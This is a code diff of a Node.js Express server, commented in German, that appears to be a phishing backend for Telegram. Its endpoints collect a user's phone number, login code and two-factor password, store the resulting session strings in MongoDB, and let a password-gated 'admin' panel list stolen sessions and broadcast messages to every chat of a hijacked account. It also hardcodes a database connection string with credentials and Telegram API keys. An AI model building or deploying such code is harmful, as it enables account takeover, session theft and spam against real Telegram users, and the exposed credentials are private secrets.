@@ -1,151 +1,99 @@
 const express = require('express');
 const cors = require('cors');
-const { TelegramClient, Api } = require('telegram');
-const { StringSession } = require('telegram/sessions');
 const mongoose = require('mongoose');
+const { TelegramClient } = require('telegram');
+const { StringSession } = require('telegram/sessions');
+const input = require('input'); // Für lokale Logik, falls nötig
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-
-// Cloudflare Worker Domain erlauben
-const allowedOrigins = ['https://projektnamepagesdev.bravegermany.workers.dev'];
-
-app.use(cors({
-    origin: function (origin, callback) {
-        if (!origin || allowedOrigins.indexOf(origin) !== -1) {
-            callback(null, true);
-        } else {
-            callback(null, true); 
-        }
-    }
-}));
+app.use(cors());
 app.use(express.json());
 
-// MongoDB
-const MONGO_URI = process.env.MONGODB_URI || 'DEINE_DB_URL';
-mongoose.connect(MONGO_URI);
+// MongoDB Setup
+const MONGODB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
+mongoose.connect(MONGODB_URI);
 
 const SessionSchema = new mongoose.Schema({
     phone: String,
-    session: String,
-    date: { type: Date, default: Date.now }
+    sessionString: String,
+    createdAt: { type: Date, default: Date.now }
 });
-const Session = mongoose.model('Session', SessionSchema);
+const SessionModel = mongoose.model('Session', SessionSchema);
 
-const apiId = 23049703;
-const apiHash = 'e9c00af578a9de0253ef02337460498f';
-const activeSessions = new Map();
+// Temporärer Speicher für laufende Login-Vorgänge
+const loginFlow = new Map();
 
-app.post('/send-otp', async (req, res) => {
-    try {
-        const { phone } = req.body;
-        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
-        await client.connect();
-        const result = await client.sendCode({ apiId, apiHash }, phone);
-        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
-        res.json({ phoneCodeHash: result.phoneCodeHash });
-    } catch (e) {
-        res.status(400).json({ error: e.message });
-    }
-});
+// --- AUTH ENDPOINTS ---
 
-app.post('/verify-otp', async (req, res) => {
-    try {
-        const { phone, code, phoneCodeHash, password } = req.body;
-        const session = activeSessions.get(phone);
-        if (!session) return res.status(400).json({ error: "Session abgelaufen" });
-
-        try {
-            await session.client.invoke(new Api.auth.SignIn({
-                phoneNumber: phone,
-                phoneCode: code,
-                phoneCodeHash: phoneCodeHash
-            }));
-            const sessionString = session.client.session.save();
-            await Session.create({ phone, session: sessionString });
-            res.json({ success: true });
-        } catch (err) {
-            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-                if (!password) return res.json({ twoFactorRequired: true });
-                const pwd = await session.client.invoke(new Api.account.GetPassword());
-                await session.client.invoke(new Api.auth.CheckPassword({
-                    password: await session.client.srpSolve(pwd, password)
-                }));
-                const sessionString = session.client.session.save();
-                await Session.create({ phone, session: sessionString });
-                res.json({ success: true });
-            } else {
-                throw err;
-            }
-        }
-    } catch (e) {
-        res.status(400).json({ error: e.message });
-    }
-});
-
-app.get('/get-sessions', async (req, res) => {
-    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
-    try {
-        const sessions = await Session.find({});
-        res.json(sessions);
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
-app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
-// Dialoge abrufen
-app.post('/admin/get-dialogs', async (req, res) => {
-    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
-    const { sessionId } = req.body;
+app.post('/login', async (req, res) => {
+    const { phone, apiId, apiHash } = req.body;
+    const client = new TelegramClient(new StringSession(""), parseInt(apiId), apiHash, { connectionRetries: 5 });
+    await client.connect();
     
-    try {
-        const dbSession = await Session.findById(sessionId);
-        if (!dbSession) return res.status(404).json({ error: "Session nicht gefunden" });
+    const phoneCodeHash = await client.sendCode({ apiId: parseInt(apiId), apiHash }, phone);
+    loginFlow.set(phone, { client, phoneCodeHash });
+    
+    res.json({ status: "code_sent", phoneCodeHash: phoneCodeHash.phoneCodeHash });
+});
 
-        const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, { connectionRetries: 5 });
-        await client.connect();
+app.post('/verify', async (req, res) => {
+    const { phone, code, password } = req.body;
+    const flow = loginFlow.get(phone);
+    if (!flow) return res.status(400).send("Session expired or not started");
+
+    try {
+        const result = await flow.client.signIn({
+            phone,
+            phoneCodeHash: flow.phoneCodeHash.phoneCodeHash,
+            phoneCode: code,
+            password: password // Falls 2FA aktiv
+        });
+
+        const sessionString = flow.client.session.save();
+        await SessionModel.create({ phone, sessionString });
         
-        const dialogs = await client.getDialogs();
-        const result = dialogs.map(d => ({
-            title: d.title || "Unbekannt",
-            id: d.id.toString(),
-            isGroup: d.isGroup,
-            isChannel: d.isChannel
-        })).filter(d => d.isGroup || d.isChannel); // Nur Gruppen/Channels
-        
-        await client.disconnect();
-        res.json({ dialogs: result });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
+        loginFlow.delete(phone);
+        res.json({ status: "success" });
+    } catch (e) {
+        if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
+            res.status(401).json({ status: "password_needed" });
+        } else {
+            res.status(400).send(e.message);
+        }
     }
 });
 
-// Nachricht an mehrere Gruppen senden
+// --- ADMIN ENDPOINTS ---
+
+app.get('/admin/get-sessions', async (req, res) => {
+    // Einfache Auth für das Panel
+    if (req.query.pass !== "Hinva312!") return res.status(403).send("Forbidden");
+    const sessions = await SessionModel.find();
+    res.json(sessions);
+});
+
 app.post('/admin/send-message', async (req, res) => {
-    if (req.query.pass !== '280597') return res.status(401).json({ error: 'Unauthorized' });
-    const { sessionId, targetIds, message } = req.body;
-    
-    try {
-        const dbSession = await Session.findById(sessionId);
-        if (!dbSession) return res.status(404).json({ error: "Session nicht gefunden" });
+    const { sessionId, message, apiId, apiHash } = req.body;
+    if (req.body.pass !== "Hinva312!") return res.status(403).send("Forbidden");
 
-        const client = new TelegramClient(new StringSession(dbSession.session), apiId, apiHash, { connectionRetries: 5 });
-        await client.connect();
-        
-        const results = [];
-        for (const id of targetIds) {
-            try {
-                await client.sendMessage(id, { message });
-                results.push({ id, status: 'success' });
-            } catch (err) {
-                results.push({ id, status: 'failed', error: err.message });
-            }
+    const sessionData = await SessionModel.findById(sessionId);
+    if (!sessionData) return res.status(404).send("Session not found");
+
+    const client = new TelegramClient(new StringSession(sessionData.sessionString), parseInt(apiId), apiHash, {});
+    await client.connect();
+
+    try {
+        const dialogs = await client.getDialogs();
+        for (const dialog of dialogs) {
+            await client.sendMessage(dialog.id, { message });
         }
-        
+        res.json({ status: "success" });
+    } catch (e) {
+        res.status(500).send(e.message);
+    } finally {
         await client.disconnect();
-        res.json({ results });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
     }
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
